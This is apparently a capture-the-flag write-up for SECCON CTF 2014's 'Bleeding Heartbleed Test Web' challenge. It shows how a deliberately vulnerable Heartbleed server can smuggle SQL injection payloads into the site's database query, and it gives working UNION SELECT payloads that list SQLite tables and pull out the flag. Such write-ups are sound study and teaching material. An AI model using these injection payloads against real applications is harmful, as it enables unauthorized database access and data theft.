# SECCON CTF 2014: Bleeding “Heartbleed” Test Web

**Category:** Web
**Points:** 300
**Description:**

> <http://bleeding.pwn.seccon.jp/>

## Write-up

The link points to a service that allows you to enter an IP address and a port number. The correspondingserver is then tested for the Heartbleed vulnerability.

Entering a random IP address (in this case, `173.194.65.100`, one of Google’s IPs) and port 443 results in the URL `http://bleeding.pwn.seccon.jp/?ip=173.194.65.100&port=443`, which displays the test results:

> ```
> Connecting...
> Sending Client Hello...
> Waiting for Server Hello...
>  ... received message: type = 22, ver = 0302, length = 61
>  ... received message: type = 22, ver = 0302, length = 3852
>  ... received message: type = 22, ver = 0302, length = 331
>  ... received message: type = 22, ver = 0302, length = 4
> Sending heartbeat request...
> ```

Below the test results, there is a disclaimer:

> We put test results into our database for analysis. Thank you for your understanding.

A-ha… Could this be a SQL injection challenge?

The HTML source code contains a comment:

```html
<!-- DEBUG: INSERT OK. TIME=1417889356 -->
```

This indicates that the server performs an `INSERT` query.

First, we need to set up a server that is vulnerable to Heartbleed, and that ‘bleeds’/leaks a payload under our control. Luckily, [PPP has already written a script doing just that for PlaidCTF](https://github.com/pwning/plaidctf2014/blob/master/web/heartbleed/Makefile). After some small tweaks to make it read the Heartbleed payload from a file (`/tmp/heartpayload`) at run-time rather than from a hardcoded string at compile-time, we end up with [`Makefile`](Makefile). Insert your server’s IP address at the top of the file, and then run:

```bash
$ make clean && make && ./heartbleed.sh
```

Entering your server details on the web page then takes you to <http://bleeding.pwn.seccon.jp/?ip=$your_server_ip&port=443>. By editing the `/tmp/heartpayload` file on our server and then reloading the above page, we can easily test different payloads.

Using just a single quote (`'`) as the payload results in the following error message:

> DATABASE ERROR!!! near ".": syntax error
>
> ```sql
> select time from results where result='Connecting... Sending Client Hello... Waiting for Server Hello... ... received message: type = 22, ver = 0302, length = 66 ... received message: type = 22, ver = 0302, length = 839 ... received message: type = 22, ver = 0302, length = 331 ... received message: type = 22, ver = 0302, length = 4 Sending heartbeat request... ... received message: type = 24, ver = 0302, length = 16384 Received heartbeat response: .@.'...... WARNING: server returned more data than it should - server is vulnerable! ';
> ```

It seems the server executes the abovementioned `INSERT` query, followed by a `SELECT` query just to fetch the matching timestamp that is displayed in the HTML comment.

After some attempts we realize we can override the timestamp value by using a payload like this:

```
' UNION SELECT 1337 WHERE 1=1 OR '1' LIKE '
```

The `1337` part of that payload is reflected in the HTML comment:

```html
<!-- DEBUG: INSERT OK. TIME=1337 -->
```

Since it seems to be a sqlite database, let’s try to figure out the table names:

```
' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table';--
```

The result:

```html
<!-- DEBUG: INSERT OK. TIME=results,ssFLGss,ttDMYtt -->
```

So there are three tables: `results`, `ssFLGss`, and `ttDMYtt`. That second one seems interesting. Eventually we end up with this final payload:

```
' UNION SELECT flag from ssFLGss WHERE 1=1 OR '1' LIKE '
```

And the result:

```
<!-- DEBUG: INSERT OK. TIME=SECCON{IknewIt!SQLiteAgain!!!} -->
```

The flag is `SECCON{IknewIt!SQLiteAgain!!!}`.

## Other write-ups and resources

* <http://tasteless.eu/2014/12/seccon-ctf-2014-online-qualifications-web300-writeup/>
* <http://lovelydream.gitcafe.com/2014/12/08/seccon/#Web_300_Heartbleed>
* <https://github.com/S42X/CTF/blob/master/SECCON/Bleeding_Heartbleed.md>
* [Portuguese](https://ctf-br.org/wiki/seccon/seccon2014/w300-bleeding-heartbleed-test-web/)
* [Thai Video](https://www.youtube.com/watch?v=AmcWJSr-4C8)
